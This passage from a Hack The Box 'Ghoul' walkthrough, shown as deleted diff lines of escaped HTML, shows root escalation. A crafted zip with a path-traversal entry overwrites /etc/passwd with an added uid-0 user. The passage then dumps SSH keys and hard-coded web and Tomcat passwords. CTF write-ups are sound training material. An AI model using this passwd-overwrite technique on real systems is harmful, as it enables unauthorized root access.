-&lt;p&gt;&lt;br /&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; to generate the hash of the password (&lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt;) :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# openssl passwd AAAA
-gDlPrjU6SWeKo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I added a new user called &lt;code class=&quot;highlighter-rouge&quot;&gt;rooot&lt;/code&gt; with the the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 0  to the &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# echo &quot;rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash&quot; &amp;gt;&amp;gt; passwd
-root@kali:~/Desktop/HTB/boxes/ghoul# cat passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
-kaneki:x:1000:1000::/home/kaneki:/bin/bash
-Eto:x:1001:1001::/home/Eto:/bin/bash
-noro:x:1002:1002::/home/noro:/bin/bash
-rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
-root@kali:~/Desktop/HTB/boxes/ghoul#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;After that I created the &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; file like I did before :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# cd /etc/
-root@kali:/etc# mv passwd passwd.1
-root@kali:/etc# cp ~/Desktop/HTB/boxes/ghoul/passwd .
-root@kali:/etc# cd -
-/root/Desktop/HTB/boxes/ghoul
-root@kali:~/Desktop/HTB/boxes/ghoul# zip passwd.zip ../../../../../../../../etc/passwd
-  adding: ../../../../../../../../etc/passwd (deflated 62%)
-root@kali:~/Desktop/HTB/boxes/ghoul# rm /etc/passwd
-root@kali:~/Desktop/HTB/boxes/ghoul# mv /etc/passwd.1 /etc/passwd
-root@kali:~/Desktop/HTB/boxes/ghoul# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I uploaded it :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Now we can do &lt;code class=&quot;highlighter-rouge&quot;&gt;su rooot&lt;/code&gt; and use &lt;code class=&quot;highlighter-rouge&quot;&gt;AAAA&lt;/code&gt; as a password :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Aogiri:/var/www/html$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
-kaneki:x:1000:1000::/home/kaneki:/bin/bash
-Eto:x:1001:1001::/home/Eto:/bin/bash
-noro:x:1002:1002::/home/noro:/bin/bash
-rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
-www-data@Aogiri:/var/www/html$ su rooot
-Password: 
-root@Aogiri:/var/www/html# id
-uid=0(root) gid=0(root) groups=0(root)
-root@Aogiri:/var/www/html# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;And I could get the user flag from &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/kaneki&lt;/code&gt; :&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/ghoul/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;We owned user.
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;enumeration-pivoting-from-aogiri-to-kaneki-pc&quot;&gt;Enumeration, Pivoting from Aogiri to kaneki-pc&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;After getting root I couldn’t find the root flag :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/kaneki# cd /root/
-root@Aogiri:~# ls -la
-total 48
-drwx------ 1 root root  4096 Apr 28 14:17 .
-drwxr-xr-x 1 root root  4096 Dec 13  2018 ..
-lrwxrwxrwx 1 root root     9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rw-r--r-- 1 root root  3106 Dec 13  2018 .bashrc
-drwx------ 1 root root  4096 Dec 13  2018 .cache
--rw-r--r-- 1 root root   148 Dec 13  2018 .profile
--rw-r--r-- 1 root root     0 Jan 22  2019 .selected_editor
-drw------- 1 root root  4096 Dec 13  2018 .ssh
--rw------- 1 root root 12094 Apr 28 14:17 .viminfo
-root@Aogiri:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;So I started to enumerate the home directories, web and configuration files. 
-&lt;br /&gt;Every user had some notes (hints) in their home directory :
-&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Eto&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/Eto# ls -al
-total 40
-drwx------ 1 Eto  Eto  4096 Dec 13  2018 .
-drwxr-xr-x 1 root root 4096 Dec 13  2018 ..
-lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rwx------ 1 Eto  Eto   220 Dec 13  2018 .bash_logout
--rwx------ 1 Eto  Eto  3771 Dec 13  2018 .bashrc
--rwx------ 1 Eto  Eto   807 Dec 13  2018 .profile
-drwx------ 1 Eto  Eto  4096 Dec 13  2018 .ssh
--rwx------ 1 Eto  Eto    92 Dec 13  2018 alert.txt
-root@Aogiri:/home/Eto# cat alert.txt 
-Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
-root@Aogiri:/home/Eto# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/kaneki# ls -al
-total 92
-drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .
-drwxr-xr-x 1 root   root    4096 Dec 13  2018 ..
-lrwxrwxrwx 1 root   root       9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rwx------ 1 kaneki kaneki   220 Dec 13  2018 .bash_logout
--rwx------ 1 kaneki kaneki  3771 Dec 13  2018 .bashrc
--rwx------ 1 kaneki kaneki   807 Dec 13  2018 .profile
-drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .ssh
--rw------- 1 kaneki kaneki  1802 Dec 13  2018 .viminfo
--rw------- 1 kaneki kaneki   148 Dec 13  2018 note.txt
--rwx------ 1 kaneki kaneki   136 Dec 13  2018 notes
--rwx------ 1 kaneki kaneki 39382 Dec 13  2018 secret.jpg
--rwx------ 1 kaneki kaneki    33 Dec 13  2018 user.txt
-root@Aogiri:/home/kaneki# cat note.txt 
-Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
-root@Aogiri:/home/kaneki# cat notes
-I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
-DM me for the access.
-root@Aogiri:/home/kaneki# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;noro&lt;/code&gt; :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home# cd noro/
-root@Aogiri:/home/noro# ls -al
-total 40
-drwx------ 1 noro noro 4096 Dec 13  2018 .
-drwxr-xr-x 1 root root 4096 Dec 13  2018 ..
-lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rwx------ 1 noro noro  220 Dec 13  2018 .bash_logout
--rwx------ 1 noro noro 3771 Dec 13  2018 .bashrc
--rwx------ 1 noro noro  807 Dec 13  2018 .profile
-drwx------ 1 noro noro 4096 Dec 13  2018 .ssh
--rwx------ 1 noro noro   24 Dec 13  2018 to-do.txt
-root@Aogiri:/home/noro# cat to-do.txt 
-Need to update backups.
-root@Aogiri:/home/noro# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I could also get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; info for the 3 users :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aogiri:/home/Eto/.ssh# ls -al
-total 28
-drwx------ 1 Eto Eto 4096 Dec 13  2018 .
-drwx------ 1 Eto Eto 4096 Dec 13  2018 ..
--rwx------ 1 Eto Eto  392 Dec 13  2018 authorized_keys
--rwx------ 1 Eto Eto 1675 Dec 13  2018 id_rsa
--rwx------ 1 Eto Eto  392 Dec 13  2018 id_rsa.pub
-root@Aogiri:/home/Eto/.ssh# cat authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzKoGE8Z9QDJDlC52zJFtQHHvZGxXgLi8fnYCOCi6GvuDV+ZNt3krFCwbkn02HAExvj1J9GXkPbZGNwMlYOYNZPqVOT7RRJML9yQNKxl4FW2IX4R23DPN17i/vjF4Gyjkk05H+P4QXsk34KZ71SOT+KMGTJ2tpV+VUKAl6jlMJM5ahDAPgrA6k2DOLk+oRF4c7Riwc2xz3/PNI/EJR8MMK5tP8bp6NUPt2AtCLO495dBFeGX6I164G5csjxxJKx5mzgjJsv5BL0l4H0RvLobDoXF++Lm3r580R6dVFsSlkC7TLJ8oscreVs6cfanQwc0E7zs61dipl5q9ceW1XWK/J Eto@Aogiri                              
-root@Aogiri:/home/Eto/.ssh# cd ../../kaneki/.ssh/
-root@Aogiri:/home/kaneki/.ssh# ls -la
-total 28
-drwx------ 1 kaneki kaneki 4096 Dec 13  2018 .
-drwx------ 1 kaneki kaneki 4096 Dec 13  2018 ..
--rwx------ 1 kaneki kaneki  797 Dec 13  2018 authorized_keys
--rwx------ 1 kaneki kaneki 1766 Dec 13  2018 id_rsa
--rwx------ 1 kaneki kaneki  395 Dec 13  2018 id_rsa.pub
-root@Aogiri:/home/kaneki/.ssh# cat authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc                    
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri                           
-root@Aogiri:/home/kaneki/.ssh# cd ../../noro/.ssh/
-root@Aogiri:/home/noro/.ssh# ls -al
-total 28
-drwx------ 1 noro noro 4096 Dec 13  2018 .
-drwx------ 1 noro noro 4096 Dec 13  2018 ..
--rwx------ 1 noro noro  393 Dec 13  2018 authorized_keys
--rwx------ 1 noro noro 1675 Dec 13  2018 id_rsa
--rwx------ 1 noro noro  393 Dec 13  2018 id_rsa.pub
-root@Aogiri:/home/noro/.ssh# cat authorized_keys 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAIchqQ1i+uOQ4jckHbO8sdtks3Cm6Ygie9youcFvqH6rBSxqWdQn8PdQ/HgrXN+RvED28aRC0kkzACL79gx9RGS4/kxqZBlPyP9mu7BWmC1J0NLACws0mvinztpixUaNj2w4WaBBe2+MpfeRoo9Abk4sBcZC7De6ZZl6RRqrdsb1kTZSWMXyxIOJMZrc+3dAc5+faujSkyeVbudjSlLf3g8xis/uSE3OvGhF4ypYDGDSRYbLY8oScDNU0eQexGMXYcY10z5f69hnrvaZ8wkvTKXwqHoMpgtjBz5NxewnY6UqhdMn0LkEeZdtK6UPRHdfSwoxjOgSyjaEmhU013d+p noro@Aogiri
-root@Aogiri:/home/noro/.ssh# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; there was a public key for &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki_pub@kaneki-pc&lt;/code&gt;, with that and the hints about &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki&lt;/code&gt;’s pc and the other file server it was obvious that we need to pivot to another host. But before that I could find some passwords in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/users/login.php&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Starts the session */&lt;/span&gt;
-        &lt;span class=&quot;cm&quot;&gt;/* Check Login form submitted */&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Submit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-                &lt;span class=&quot;cm&quot;&gt;/* Define username and associated password array */&lt;/span&gt;
-                &lt;span class=&quot;nv&quot;&gt;$logins&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'kaneki'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'123456'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'noro'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password123'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'abcdef'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-                &lt;span class=&quot;cm&quot;&gt;/* Check and assign submitted Username and Password to new variable */&lt;/span&gt;                                                   
-                &lt;span class=&quot;nv&quot;&gt;$Username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-                &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-                &lt;span class=&quot;cm&quot;&gt;/* Check Username and Password existence in defined array */&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$logins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-                        &lt;span class=&quot;cm&quot;&gt;/* Success: Set session variables and redirect to Protected page  */&lt;/span&gt;
-                        &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UserData'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$logins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$Username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-                        &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;location:index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                        &lt;span class=&quot;cm&quot;&gt;/*Unsuccessful attempt: Set error message */&lt;/span&gt;
-                        &lt;span class=&quot;nv&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;span style='color:red'&amp;gt;Invalid Login Details&amp;lt;/span&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;And in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/tomcat7/conf/tomcat-users.xml&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version='1.0' encoding='utf-8'?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
-  Licensed to the Apache Software Foundation (ASF) under one or more
-  contributor license agreements.  See the NOTICE file distributed with
-  this work for additional information regarding copyright ownership.
-  The ASF licenses this file to You under the Apache License, Version 2.0
-  (the &quot;License&quot;); you may not use this file except in compliance with
-  the License.  You may obtain a copy of the License at
-
-      http://www.apache.org/licenses/LICENSE-2.0
-
-  Unless required by applicable law or agreed to in writing, software
-  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
-  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-  See the License for the specific language governing permissions and
-  limitations under the License.
---&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;tomcat-users&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
-  NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required
-  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,
-  you must define such a user - the username and password are arbitrary. It is
-  strongly recommended that you do NOT use one of the users in the commented out
-  section below since they are intended for use with the examples web
-  application.
---&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
-  NOTE:  The sample user and role entries below are intended for use with the
-  examples web application. They are wrapped in a comment and thus are ignored
-  when reading this file. If you wish to configure these users for use with the
-  examples web application, do not forget to remove the &amp;lt;!.. ..&amp;gt; that surrounds
-  them. You will also need to set the passwords to something appropriate.
---&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
-  &amp;lt;role rolename=&quot;tomcat&quot;/&amp;gt;
-  &amp;lt;role rolename=&quot;role1&quot;/&amp;gt;
-  &amp;lt;user username=&quot;tomcat&quot; password=&quot;&amp;lt;must-be-changed&amp;gt;&quot; roles=&quot;tomcat&quot;/&amp;gt;
-  &amp;lt;user username=&quot;both&quot; password=&quot;&amp;lt;must-be-changed&amp;gt;&quot; roles=&quot;tomcat,role1&quot;/&amp;gt;
-  &amp;lt;user username=&quot;role1&quot; password=&quot;&amp;lt;must-be-changed&amp;gt;&quot; roles=&quot;role1&quot;/&amp;gt;
---&amp;gt;&lt;/span&gt;
-
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;user&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;roles=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;&amp;lt;!--&amp;lt;user username=&quot;admin&quot; password=&quot;test@aogiri123&quot; roles=&quot;admin&quot; /&amp;gt;
-  &amp;lt;role rolename=&quot;admin&quot; /&amp;gt;--&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tomcat-users&amp;gt;&lt;/span&gt; 
